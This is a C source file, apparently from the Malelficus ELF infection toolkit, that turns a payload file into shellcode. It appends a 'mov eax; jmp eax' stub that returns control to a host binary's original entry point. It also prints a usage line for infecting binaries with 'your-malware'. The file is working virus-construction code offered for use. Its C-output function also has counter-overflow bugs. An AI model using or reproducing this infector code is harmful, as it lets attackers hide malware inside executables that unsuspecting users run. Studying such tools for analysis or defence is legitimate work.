#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

#ifdef __STDC__
extern int fileno(FILE*);
#endif

#include <malelf/object.h>
#include <malelf/defines.h>
#include <malelf/util.h>
#include <malelf/error.h>
#include <malelf/types.h>
#include <malelf/infect.h>

_i32 shellcode_create_malelficus(FILE* fd_o,
                     int in_size,
                     FILE* fd_i,
                                 unsigned long int original_entry_point,
                                 unsigned long int magic_bytes) {
  _u8 *mem = NULL;
  _i32 count = 0;

  union malelf_dword entry_point;

  if (original_entry_point > 0) {
      entry_point.long_val = original_entry_point;
  } else if (magic_bytes != 0x00) {
      entry_point.long_val = magic_bytes;
  } else {
      entry_point.long_val = MALELF_MAGIC_BYTES;
  }
  
  mem = mmap(0, in_size, PROT_READ, MAP_SHARED, fileno(fd_i), 0);
  if (mem == MAP_FAILED) {
    LOG_ERROR("Failed to map binary in memory...\n");
    return MALELF_EALLOC;
  }

  while (count < in_size) {
      count += fwrite(mem + count, sizeof(_u8), 1, fd_o);
  }

  fwrite("\xb8", sizeof(_u8), 1, fd_o);
  count++;
  fwrite(&entry_point.char_val[0], 1, 1, fd_o);
  fwrite(&entry_point.char_val[1], 1, 1, fd_o);
  fwrite(&entry_point.char_val[2], 1, 1, fd_o);
  fwrite(&entry_point.char_val[3], 1, 1, fd_o);
  /* jmp eax */
  fwrite("\xff\xe0", sizeof(_u8), 2, fd_o);

  LOG_SUCCESS("New shellcode created successfully\n");
  LOG_SUCCESS("Now you can use: malelf infect -m 0 -f %d -p <your-malware> -i <binary-to-infect> -o <infected-file>\n", count);

  return MALELF_SUCCESS;
}

_u8 shellcode_create_c(FILE* fd_o,
                     int in_size,
                     FILE* fd_i,
                     unsigned long int original_entry_point) {
  _u8 *mem, i, count = 0;

  union entry_t {
    unsigned long int int_entry;
    unsigned char char_entry[4];
  };

  union entry_t entry_point;

  entry_point.int_entry = original_entry_point;

  mem = mmap(0, in_size, PROT_READ, MAP_SHARED, fileno(fd_i), 0);
  if (mem == MAP_FAILED) {
    LOG_ERROR("Failed to map binary in memory...\n");
    return -1;
  }

  malelf_print(fd_o, "/* Generated by Malelficus */\n");

  malelf_print(fd_o, "\n\nunsigned char shellcode[] = \n");

  for (i = 0; i < in_size; i++, count++) {
    if (i == 0) {
      malelf_print(fd_o, "\t\t\t\"");
    }
    malelf_print(fd_o, "\\x%02x", mem[i]);
    if (i > 0 && ((i+1) % 10) == 0) {
      malelf_print(fd_o, "\"\n\t\t\t\"");
    } else if (i == (in_size - 1)) {
      malelf_print(fd_o, "\"\n");
    }
  }

  malelf_print(fd_o, "\n");

  malelf_print(fd_o, "\t\t\t/* mov eax, XXXX */\n");

  malelf_print(fd_o, "\t\t\t\"");
  malelf_print(fd_o, "\\xb8"); /* mov eax, XXXX */
  count++;
  malelf_print(fd_o, "\\x%02x", entry_point.char_entry[0]);
  malelf_print(fd_o, "\\x%02x", entry_point.char_entry[1]);
  malelf_print(fd_o, "\\x%02x", entry_point.char_entry[2]);
  malelf_print(fd_o, "\\x%02x", entry_point.char_entry[3]);

  malelf_print(fd_o, "\"\n");

  malelf_print(fd_o, "\t\t\t/* jmp eax */\n");
  /* jmp eax */
  malelf_print(fd_o, "\t\t\t\"\\xff\\xe0");
  
  malelf_print(fd_o, "\";\n");

  malelf_print(fd_o, "\nunsigned int patch_offset = %d;\n\n", count);

  return MALELF_SUCCESS;
}
